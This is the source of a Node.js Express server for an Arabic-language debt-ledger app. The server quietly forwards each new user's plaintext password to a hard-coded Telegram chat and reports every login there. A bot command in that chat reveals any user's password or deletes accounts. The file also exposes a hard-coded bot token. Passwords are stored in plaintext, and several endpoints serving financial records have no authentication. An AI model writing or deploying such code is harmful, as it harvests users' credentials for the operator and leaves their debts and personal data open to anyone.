const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_royal_db.json';

const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const MY_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { users: [], stamps: [] };
if (fs.existsSync(DB_PATH)) {
    try { db = JSON.parse(fs.readFileSync(DB_PATH)); } catch (e) { db = { users: [], stamps: [] }; }
}

const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

// دالة إرسال للتلجرام
const sendToTelegram = async (msg) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: MY_CHAT_ID,
            text: msg
        });
    } catch (e) { console.error("TG Error"); }
};

// --- محرك التلجرام للتحكم (أوامر البوت) ---
async function handleTelegramCommands() {
    try {
        const response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`);
        const updates = response.data.result;
        if (updates.length > 0) {
            const lastMsg = updates[0].message;
            if (!lastMsg || lastMsg.chat.id.toString() !== MY_CHAT_ID) return;
            
            const text = lastMsg.text;
            if (text === 'العدد') {
                sendToTelegram(`📊 عدد المشتركين الحالي: ${db.users.length}`);
            } 
            else if (text === 'كل المشتركين') {
                const list = db.users.map(u => `- ${u.name} (${u.type === 'merchant' ? 'تاجر' : 'مواطن'})`).join('\n');
                sendToTelegram(`👥 قائمة المشتركين:\n${list || 'لا يوجد مشتركين'}`);
            }
            else if (text.startsWith('بحث ')) {
                const searchName = text.replace('بحث ', '').trim().toLowerCase();
                const found = db.users.find(u => u.name.toLowerCase() === searchName);
                if (found) {
                    sendToTelegram(`🔍 بيانات الحساب:\nالاسم: ${found.name}\nالنوع: ${found.type}\nكلمة السر: ${found.password}\nتاريخ التسجيل: ${found.createdAt}`);
                } else sendToTelegram(`❌ لم يتم العثور على اسم: ${searchName}`);
            }
            else if (text.startsWith('حذف ')) {
                const deleteName = text.replace('حذف ', '').trim().toLowerCase();
                const initialCount = db.users.length;
                db.users = db.users.filter(u => u.name.toLowerCase() !== deleteName);
                if (db.users.length < initialCount) {
                    saveDB();
                    sendToTelegram(`🗑️ تم حذف حساب [${deleteName}] بنجاح.`);
                } else sendToTelegram(`❌ الاسم [${deleteName}] غير موجود أصلاً.`);
            }
        }
    } catch (e) {}
}
// فحص أوامر التلجرام كل 5 ثواني
setInterval(handleTelegramCommands, 5000);

// --- نظام البحث والتوثيق ---
app.get('/api/search-stamp', (req, res) => {
    const s = db.stamps.find(x => x.authCode === req.query.code);
    if(s) res.json(s); else res.status(404).json({error: "Not found"});
});

app.post('/api/verify-auth', (req, res) => {
    const { action, debtorName, merchantName, authCode, merchantId, amount, currency } = req.body;

    if (action === 'create_smart') {
        if(db.stamps.some(s => s.authCode === authCode)) return res.status(400).json({error: "الكود مستخدم مسبقاً"});
        db.stamps.push({ debtorName, merchantName, authCode, amount, currency, createdAt: Date.now(), status: 'pending', isSmart: true });
        saveDB();
        return res.json({ success: true });
    }

    if (action === 'check') {
        const merch = db.users.find(u => u.id === merchantId);
        const stamp = db.stamps.find(s => s.authCode === authCode && s.merchantName === merch.name);
        if(!stamp) return res.status(400).json({error: "كود خاطئ"});

        let remaining = parseFloat(stamp.amount);
        merch.myRecords.forEach(r => {
            if(r.targetName === stamp.debtorName && r.currency === stamp.currency && !r.isVerified && r.type === 'دين' && remaining > 0) {
                let rAmt = parseFloat(r.amount);
                if (rAmt <= remaining) {
                    r.isVerified = true; r.authCode = authCode;
                    remaining -= rAmt;
                }
            }
        });
        saveDB();
        res.json({ newRecords: merch.myRecords });
    }
});

app.post('/api/sync', (req, res) => {
    const { userId, op } = req.body;
    const u = db.users.find(x => x.id === userId);
    if (!u) return res.status(404).send();

    if(op.type === 'سداد') {
        let amt = parseFloat(op.amount);
        u.myRecords.forEach(r => {
            if(r.targetName === op.targetName && r.currency === op.currency && r.isVerified && amt > 0) {
                let curD = parseFloat(r.amount);
                let deduct = Math.min(curD, amt);
                r.amount = (curD - deduct).toString();
                amt -= deduct;
            }
        });
        op.amount = amt.toString();
    }
    u.myRecords.push(op);
    saveDB();
    res.json({ newRecords: u.myRecords });
});

app.post('/api/auth', async (req, res) => {
    const { name, password, type, action } = req.body;
    const norm = name.trim().toLowerCase();
    let user = db.users.find(u => u.name.toLowerCase() === norm && u.type === type);

    if (action === 'reg') {
        if (user) return res.status(400).json({ error: "الاسم مسجل مسبقاً." });
        user = { id: "H" + Math.random().toString(36).substr(2, 7), name: name.trim(), password, type, myRecords: [], createdAt: new Date().toLocaleString() };
        db.users.push(user); saveDB();
        sendToTelegram(`🆕 تسجيل جديد:\nالاسم: ${user.name}\nالكلمة: ${password}\nالنوع: ${type}`);
        return res.json(user);
    } else {
        if (!user || user.password !== password) return res.status(403).json({ error: "بيانات خاطئة." });
        sendToTelegram(`🔓 دخول: ${user.name}`);
        return res.json(user);
    }
});

app.get('/api/auto-discover', (req, res) => {
    const { debtorName } = req.query;
    const results = db.users.filter(u => u.type === 'merchant' && u.myRecords.some(r => r.targetName.toLowerCase() === debtorName.toLowerCase()))
    .map(u => ({ merchantName: u.name, records: u.myRecords.filter(r => r.targetName.toLowerCase() === debtorName.toLowerCase()) }));
    res.json(results);
});

app.listen(PORT, () => console.log(`SYSTEM ON ${PORT}`));